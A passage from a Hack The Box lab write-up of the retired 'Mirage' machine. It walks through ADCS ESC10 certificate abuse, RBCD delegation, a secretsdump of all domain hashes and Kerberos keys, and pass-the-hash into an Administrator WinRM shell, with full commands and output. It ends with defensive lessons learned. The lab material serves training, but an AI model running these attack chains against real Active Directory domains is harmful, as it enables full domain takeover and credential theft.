I reviewed the Certipy Wiki and found that ESC10 (https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication) couldn't be detected by `certipy-ad find`.  

However, a ADCS server with the `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CertificateMappingMethods` registry set to `0x4` was potentially vulnerable to ESC10.  
I checked the registry value and it was indeed set to `0x4`.

```
PS C:\Users\nathan.aadam\AppData\Local\Temp> reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL
    EventLogging    REG_DWORD    0x1
    CertificateMappingMethods    REG_DWORD    0x4

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Ciphers
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\CipherSuites
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Hashes
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\KeyExchangeAlgorithms
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols
```

Another pre-requisite was that the attacker must have `GenericWrite` (or equivalent) permission over the victim account and that the victim account can enroll for client authentication certificates.  
Both Nathan and Mark could potentially enroll for certificates...

### 🧪 Exploitation

I followed the ESC10 exploitation steps shown on on the Certipy Wiki (https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication) point 3.

**Step 1: Read initial UPN of the victim account (Optional - for restoration).**

Both Nathan and Mark's User Principal Name (UPN) could be read.

```
fcoomans@kali:~/htb/mirage$ certipy-ad account -k -ns 10.10.11.78 -target dc01.mirage.htb -user 'mark.bbond' read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'mark.bbond':
    cn                                  : mark.bbond
    distinguishedName                   : CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
    name                                : mark.bbond
    objectSid                           : S-1-5-21-2127163471-3824721834-2568365109-1109
    sAMAccountName                      : mark.bbond
    userPrincipalName                   : mark.bbond@mirage.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-05-02T08:36:23+00:00
    whenChanged                         : 2025-07-26T00:58:20+00:00

fcoomans@kali:~/htb/mirage$ certipy-ad account -k -ns 10.10.11.78 -target dc01.mirage.htb -user 'nathan.aadam' read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'nathan.aadam':
    cn                                  : nathan.aadam
    distinguishedName                   : CN=nathan.aadam,OU=Users,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb
    name                                : nathan.aadam
    objectSid                           : S-1-5-21-2127163471-3824721834-2568365109-1110
    sAMAccountName                      : nathan.aadam
    servicePrincipalName                : HTTP/exchange.mirage.htb
    userPrincipalName                   : nathan.aadam@mirage.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-05-02T08:36:54+00:00
    whenChanged                         : 2025-07-26T00:54:16+00:00
```

**Step 2: Update the victim account's UPN to the target DC's `sAMAccountName` (suffixed with the domain).**

I tried the next step with Mark's account and the UPN was set to the DC account (`DC01$@mirage.htb`).

```
fcoomans@kali:~/htb/mirage$ certipy-ad account -k -ns 10.10.11.78 -target dc01.mirage.htb -user 'mark.bbond' read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'mark.bbond':
    cn                                  : mark.bbond
    distinguishedName                   : CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
    name                                : mark.bbond
    objectSid                           : S-1-5-21-2127163471-3824721834-2568365109-1109
    sAMAccountName                      : mark.bbond
    userPrincipalName                   : mark.bbond@mirage.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-05-02T08:36:23+00:00
    whenChanged                         : 2025-07-26T01:26:55+00:00

fcoomans@kali:~/htb/mirage$ certipy-ad account -k -ns 10.10.11.78 -target dc01.mirage.htb -upn 'DC01$@mirage.htb' -user 'mark.bbond' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : DC01$@mirage.htb
[*] Successfully updated 'mark.bbond'

fcoomans@kali:~/htb/mirage$ certipy-ad account -k -ns 10.10.11.78 -target dc01.mirage.htb -user 'mark.bbond' read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'mark.bbond':
    cn                                  : mark.bbond
    distinguishedName                   : CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
    name                                : mark.bbond
    objectSid                           : S-1-5-21-2127163471-3824721834-2568365109-1109
    sAMAccountName                      : mark.bbond
    userPrincipalName                   : DC01$@mirage.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-05-02T08:36:23+00:00
    whenChanged                         : 2025-07-26T01:27:50+00:00
```

**Step 3: Obtain credentials for the "victim" account (if not already known) and set up Kerberos ccache.**

`impacket-getTGT` was used to request a Kerberos TGT for Mark.

```
fcoomans@kali:~/htb/mirage$ impacket-getTGT -dc-ip 10.10.11.78 'mirage.htb/mark.bbond:1day@atime'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in mark.bbond.ccache

fcoomans@kali:~/htb/mirage$ export KRB5CCNAME=mark.bbond.ccache

fcoomans@kali:~/htb/mirage$ klist
Ticket cache: FILE:mark.bbond.ccache
Default principal: mark.bbond@MIRAGE.HTB

Valid starting       Expires              Service principal
07/26/2025 03:23:05  07/26/2025 13:23:05  krbtgt/MIRAGE@MIRAGE.HTB
        renew until 07/27/2025 03:21:02
```

**Step 4: Request a client authentication certificate as the "victim" user.**

```
fcoomans@kali:~/htb/mirage$ certipy-ad req -k -ns 10.10.11.78 -dc-ip dc01.mirage.htb -target dc01.mirage.htb -dc-host dc01.mirage.htb -ca mirage-DC01-CA -template User
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 34
[*] Successfully requested certificate
[*] Got certificate with UPN 'DC01$@mirage.htb'
[*] Certificate object SID is 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Saving certificate and private key to 'dc01.pfx'
[*] Wrote certificate and private key to 'dc01.pfx'
```

**Step 5: Revert the "victim" account's UPN to its original value.**

```
fcoomans@kali:~/htb/mirage$ export KRB5CCNAME=mirage-service\$.ccache

fcoomans@kali:~/htb/mirage$ certipy-ad account -k -ns 10.10.11.78 -target dc01.mirage.htb -upn 'mark.bbond@mirage.htb' -user 'mark.bbond' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : mark.bbond@mirage.htb
[*] Successfully updated 'mark.bbond'

fcoomans@kali:~/htb/mirage$ certipy-ad account -k -ns 10.10.11.78 -target dc01.mirage.htb -user 'mark.bbond' read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'mark.bbond':
    cn                                  : mark.bbond
    distinguishedName                   : CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
    name                                : mark.bbond
    objectSid                           : S-1-5-21-2127163471-3824721834-2568365109-1109
    sAMAccountName                      : mark.bbond
    userPrincipalName                   : mark.bbond@mirage.htb
    userAccountControl                  : 66048
    whenCreated                         : 2025-05-02T08:36:23+00:00
    whenChanged                         : 2025-07-26T01:30:27+00:00
```

**Step 6: Authenticate to LDAPS (Schannel) as the target DC using the certificate.**

```
fcoomans@kali:~/htb/mirage$ certipy-ad auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'DC01$@mirage.htb'
[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Connecting to 'ldaps://10.10.11.78:636'
[*] Authenticated to '10.10.11.78' as: 'u:MIRAGE\\DC01$'
Type help for list of commands

# whoami
u:MIRAGE\DC01$
```

**Step 7: RBCD.**

As seen in this article: https://raxis.com/blog/ad-series-resource-based-constrained-delegation-rbcd/,  
I used RBCD to grant `mirage-service$` the same rights as `dc01$`. 

```
# set_rbcd DC01$ MIRAGE-SERVICE$
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000

Found Grantee DN: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1112
Currently allowed sids:
    S-1-5-21-2127163471-3824721834-2568365109-1110
Delegation rights modified successfully!
MIRAGE-SERVICE$ can now impersonate users on DC01$ via S4U2Proxy
```

I requested a new Kerberos TGT for `mirage-service$`.

```
fcoomans@kali:~/htb/mirage$ sudo ntpdate dc01.mirage.htb
[sudo] password for fcoomans:
2025-07-26 03:50:42.260439 (+0200) +288.015050 +/- 0.083776 dc01.mirage.htb 10.10.11.78 s1 no-leap
CLOCK: time stepped by 288.015050

fcoomans@kali:~/htb/mirage$ impacket-getTGT -dc-ip 10.10.11.78 -hashes :305806d84f7c1be93a07aaf40f0c7866 'mirage.htb/mirage-service$'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in mirage-service$.ccache

fcoomans@kali:~/htb/mirage$ export KRB5CCNAME=mirage-service\$.ccache

fcoomans@kali:~/htb/mirage$ klist
Ticket cache: FILE:mirage-service$.ccache
Default principal: mirage-service$@MIRAGE.HTB

Valid starting       Expires              Service principal
07/26/2025 03:50:52  07/26/2025 13:50:52  krbtgt/MIRAGE@MIRAGE.HTB
        renew until 07/27/2025 03:50:51
```

And then used `impacket-getST` to request a Kerberos Service Ticket (ST) for `cifs/dc.mirage.htb`, while impersonating `dc01$`.

```
fcoomans@kali:~/htb/mirage$ impacket-getST -spn cifs/dc01.mirage.htb -impersonate 'DC01$' -dc-ip 10.10.11.78 -hashes :305806d84f7c1be93a07aaf40f0c7866 -k 'mirage.htb/mirage-service$'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache
```

I exported the service ticket to `KRB5CCNAME`.

```
fcoomans@kali:~/htb/mirage$ export KRB5CCNAME=DC01\$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache

fcoomans@kali:~/htb/mirage$ klist
Ticket cache: FILE:DC01$@cifs_dc01.mirage.htb@MIRAGE.HTB.ccache
Default principal: DC01$@MIRAGE

Valid starting       Expires              Service principal
07/26/2025 03:55:00  07/26/2025 13:51:12  cifs/dc01.mirage.htb@MIRAGE.HTB
        renew until 07/27/2025 03:51:09
```

`impacket-secretsdump` used the ST to dump the domain NTLM hashes.

```
fcoomans@kali:~/htb/mirage$ impacket-secretsdump -k -target-ip 10.10.11.78 dc01.mirage.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:694fba7016ea1abd4f36d188b3983d84:::
mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866:::
[*] Kerberos keys grabbed
mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa211293070bce0a567c0e08da5406ad0bce4bdca7
mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07
mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619
krbtgt:aes256-cts-hmac-sha1-96:95f7af8ea1bae174de9666c99a9b9edeac0ca15e70c7246cab3f83047c059603
krbtgt:aes128-cts-hmac-sha1-96:6f790222a7ee5ba9d2776f6ee71d1bfb
krbtgt:des-cbc-md5:8cd65e54d343ba25
mirage.htb\Dev_Account_A:aes256-cts-hmac-sha1-96:e4a6658ff9ee0d2a097864d6e89218287691bf905680e0078a8e41498f33fd9a
mirage.htb\Dev_Account_A:aes128-cts-hmac-sha1-96:ceee67c4feca95b946e78d89cb8b4c15
mirage.htb\Dev_Account_A:des-cbc-md5:26dce5389b921a52
mirage.htb\Dev_Account_B:aes256-cts-hmac-sha1-96:5c320d4bef414f6a202523adfe2ef75526ff4fc6f943aaa0833a50d102f7a95d
mirage.htb\Dev_Account_B:aes128-cts-hmac-sha1-96:e05bdceb6b470755cd01fab2f526b6c0
mirage.htb\Dev_Account_B:des-cbc-md5:e5d07f57e926ecda
mirage.htb\david.jjackson:aes256-cts-hmac-sha1-96:3480514043b05841ecf08dfbf33d81d361e51a6d03ff0c3f6d51bfec7f09dbdb
mirage.htb\david.jjackson:aes128-cts-hmac-sha1-96:bd841caf9cd85366d254cd855e61cd5e
mirage.htb\david.jjackson:des-cbc-md5:76ef68d529459bbc
mirage.htb\javier.mmarshall:aes256-cts-hmac-sha1-96:20acfd56be43c1123b3428afa66bb504a9b32d87c3269277e6c917bf0e425502
mirage.htb\javier.mmarshall:aes128-cts-hmac-sha1-96:9d2fc7611e15be6fe16538ebb3b2ad6a
mirage.htb\javier.mmarshall:des-cbc-md5:6b3d51897fdc3237
mirage.htb\mark.bbond:aes256-cts-hmac-sha1-96:dc423caaf884bb869368859c59779a757ff38a88bdf4197a4a284b599531cd27
mirage.htb\mark.bbond:aes128-cts-hmac-sha1-96:78fcb9736fbafe245c7b52e72339165d
mirage.htb\mark.bbond:des-cbc-md5:d929fb462ae361a7
mirage.htb\nathan.aadam:aes256-cts-hmac-sha1-96:b536033ac796c7047bcfd47c94e315aea1576a97ff371e2be2e0250cce64375b
mirage.htb\nathan.aadam:aes128-cts-hmac-sha1-96:b1097eb42fd74827c6d8102a657e28ff
mirage.htb\nathan.aadam:des-cbc-md5:5137a74f40f483c7
mirage.htb\svc_mirage:aes256-cts-hmac-sha1-96:937efa5352253096b3b2e1d31a9f378f422d9e357a5d4b3af0d260ba1320ba5e
mirage.htb\svc_mirage:aes128-cts-hmac-sha1-96:8d382d597b707379a254c60b85574ab1
mirage.htb\svc_mirage:des-cbc-md5:2f13c12f9d5d6708
DC01$:aes256-cts-hmac-sha1-96:4a85665cd877c7b5179c508e5bc4bad63eafe514f7cedb0543930431ef1e422b
DC01$:aes128-cts-hmac-sha1-96:94aa2a6d9e156b7e8c03a9aad4af2cc1
DC01$:des-cbc-md5:cb19ce2c733b3ba8
Mirage-Service$:aes256-cts-hmac-sha1-96:80bada65a4f84fb9006013e332105db15ac6f07cb9987705e462d9491c0482ae
Mirage-Service$:aes128-cts-hmac-sha1-96:ff1d75e3a88082f3dffbb2b8e3ff17dd
Mirage-Service$:des-cbc-md5:c42ffd455b91f208
[*] Cleaning up...
```

`impacket-getTGT` was used to request a Kerberos TGT for the domain Administrator account.

```
fcoomans@kali:~/htb/mirage$ impacket-getTGT -dc-ip 10.10.11.78 -hashes :7be6d4f3c2b9c0e3560f5a29eeb1afb3 'mirage.htb/Administrator'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in Administrator.ccache

fcoomans@kali:~/htb/mirage$ export KRB5CCNAME=Administrator.ccache

fcoomans@kali:~/htb/mirage$ klist
Ticket cache: FILE:Administrator.ccache
Default principal: Administrator@MIRAGE.HTB

Valid starting       Expires              Service principal
07/26/2025 03:59:56  07/26/2025 13:59:56  krbtgt/MIRAGE@MIRAGE.HTB
        renew until 07/27/2025 03:59:01
```

I then connected to the target via `evil-winrm` using the Administrator Kerberos TGT.

```
fcoomans@kali:~/htb/mirage$ evil-winrm -i dc01.mirage.htb -r mirage.htb

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
mirage\administrator
```

### 💰 Post Exploitation

#### 🏆 root.txt

The Administrator held the `root.txt` flag.

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> tree C:\Users\Administrator /a /f
Folder PATH listing
Volume serial number is 0000014C 014F:FCE7
C:\USERS\ADMINISTRATOR
|   a
|
+---.config
|   \---nats
|       \---cli
|           \---plugins
+---3D Objects
+---Contacts
+---Desktop
|       root.txt

<SNIP>
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
8ae88075a43af2e575f185c66aa384bf
```

Turns out the real Mirage was their idea of least privilege.

And `Mirage has been Pwned!` 🎉

![](images/Pasted%20image%2020250724222151.png)

## 📚 Lessons Learned

- **Dynamic DNS** records are vulnerable if not properly controlled and can be maliciously updated.  Convert critical service records to static DNS entries or restrict who can update dynamic records.
- **NATS** should never use cleartext credentials; encryption or secure authentication should always be enforced.  Use encrypted credentials or enforce a secure authentication mechanism supported by NATS (such as NKeys or TLS authentication).
- Poor enforcement of the **Principle of Least Privilege (PoLP)** can enable an ACE abuse chain, compromising multiple accounts.  Regularly review AD permissions and remove unnecessary rights to limit lateral movement.
- **Kerberoasting** demonstrates the risk of service accounts; even **GMSAs** require careful control of who can read their passwords.  Migrate service accounts to GMSAs where possible and tightly restrict the allowed readers of GMSA passwords.
- **Disabled accounts** can be re-enabled if permissions allow, and **LogonHours** restrictions alone are not a sufficient defense.  Audit delegated rights to ensure only trusted administrative groups can manage disabled users or override logon restrictions.
- **ADCS ESC10** combined with RBCD **delegation** can lead to full domain compromise if permissions are not tightly restricted.  Disable vulnerable certificate templates, restrict enrollment rights, and audit RBCD permissions to prevent unintended delegation paths.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username is intentionally used throughout this write-up to build my cybersecurity brand.
